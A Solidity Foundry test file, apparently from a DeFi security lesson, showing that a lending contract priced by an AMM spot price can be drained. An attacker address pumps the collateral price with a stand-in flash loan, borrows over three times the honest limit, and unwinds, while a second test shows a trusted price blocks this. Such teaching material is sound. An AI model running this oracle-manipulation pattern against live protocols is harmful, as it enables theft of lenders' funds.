// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ConstantProductAMM} from "../src/L21_ConstantProductAMM.sol";
import {SpotOracleLending} from "../src/L42_SpotOracleLending.sol";

contract Tok is ERC20 {
    constructor(string memory n) ERC20(n, n) {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

contract L42Test is Test {
    Tok col;
    Tok usd;
    ConstantProductAMM amm;
    SpotOracleLending lend;
    address atk = makeAddr("attacker");

    function setUp() public {
        col = new Tok("COL");
        usd = new Tok("USD");
        amm = new ConstantProductAMM(IERC20(address(col)), IERC20(address(usd)));
        col.mint(address(this), 1000 ether);
        usd.mint(address(this), 1000 ether);
        col.approve(address(amm), type(uint256).max);
        usd.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1000 ether, 1000 ether); // 1 COL = 1 USD
        lend = new SpotOracleLending(amm);
        usd.mint(address(lend), 10_000 ether);
        col.mint(atk, 100 ether);
        usd.mint(atk, 900 ether); // stands in for a flash loan
    }

    function _attack() internal returns (uint256 borrowedAmt) {
        vm.startPrank(atk);
        usd.approve(address(amm), type(uint256).max);
        col.approve(address(lend), type(uint256).max);
        col.approve(address(amm), type(uint256).max);
        uint256 colBought = amm.swap(IERC20(address(usd)), 900 ether, 0); // pump COL spot price ~3.6x
        lend.deposit(100 ether);
        uint256 limit = 100 ether * lend.price() / 1e18 * 8000 / 10_000;
        try lend.borrow(limit) {
            borrowedAmt = limit;
        } catch {}
        amm.swap(IERC20(address(col)), colBought, 0); // unwind
        vm.stopPrank();
    }

    function test_SpotOracleIsExploitable() public {
        uint256 honestLimit = 80 ether; // 100 COL * $1 * 80%
        uint256 got = _attack();
        assertGt(got, honestLimit * 3, "borrowed >3x the honest limit");
    }

    function test_TrustedPriceStopsIt() public {
        lend.useTrustedPrice(1e18);
        uint256 got = _attack();
        assertEq(got, 80 ether, "borrow capped at honest LTV");
    }
}
